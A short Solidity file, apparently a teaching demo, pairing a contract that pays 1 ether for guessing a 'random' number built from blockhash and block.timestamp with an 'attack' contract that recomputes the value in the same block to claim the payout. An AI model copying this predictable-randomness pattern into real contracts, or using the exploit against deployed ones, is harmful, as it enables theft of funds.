// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract randomness {
   
   fallback() external payable{}
   


   function guss(uint x) public {
     uint ans =  uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));

     if(x==ans){
         (bool sent ,)= msg.sender.call{value:1 ether}("");
         require(sent , "Failed transaction");
     }

   }

}


contract attack {

    fallback() external payable {}

    function compute_ans_and_attack(address payable _randomness) public payable {

        uint cans =  uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
        randomness(_randomness).guss(cans);
    }

    function getbalance() public view  returns(uint){
       return address(this).balance; 
    }
}